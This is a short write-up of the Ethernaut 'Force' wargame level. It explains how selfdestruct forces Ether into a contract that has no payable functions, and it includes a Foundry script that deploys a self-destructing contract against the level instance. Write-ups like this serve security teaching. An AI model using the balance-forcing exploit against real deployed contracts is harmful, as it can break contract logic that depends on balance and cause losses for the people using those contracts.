---
layout: writeup
title: "Force"
level: "Intermediate"
category: "Ethernaut"
description: "Force-feed Ether to a contract that has no payable functions using the selfdestruct opcode."
---

## Analysis

The `Force` contract is completely empty. It has no functions, no fallback, and no receive mechanism. Normally, if you try to send Ether to this contract, the transaction will fail.

**The Flaw:**
There is a way to force Ether into any contract address regardless of its code: the `selfdestruct` opcode. When a contract is destroyed via `selfdestruct(target_address)`, all of its remaining Ether is sent to the `target_address` forcibly. This transfer happens at the EVM level and **cannot be blocked** by the receiving contract.



---

## Solution

The level is solved by deploying a temporary exploit contract that immediately calls selfdestruct in its constructor.. When a contract selfdestructs, its Ether balance is forcibly transferred to the specified target address.

---

**Exploiy Script (Foundry):**

<pre class="plain-code"><code>

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Script.sol";

contract ForceExploit {
    constructor(address payable target) payable {
        // Force the contract balance into `target` and destroy this contract.
        selfdestruct(target);
    }
}

contract ExploitAgainstInstance is Script {
    function run() external {
        // Read the target instance address from env var INSTANCE_ADDRESS
        address payable target = payable(vm.envAddress("INSTANCE_ADDRESS"));

        // Start broadcasting using the private key passed via CLI (--private-key)
        vm.startBroadcast();

        // Deploy the exploit contract with 1 wei; its constructor selfdestructs into target
        new ForceExploit{value: 1 wei}(target);

        vm.stopBroadcast();
    }
}


</code></pre>

---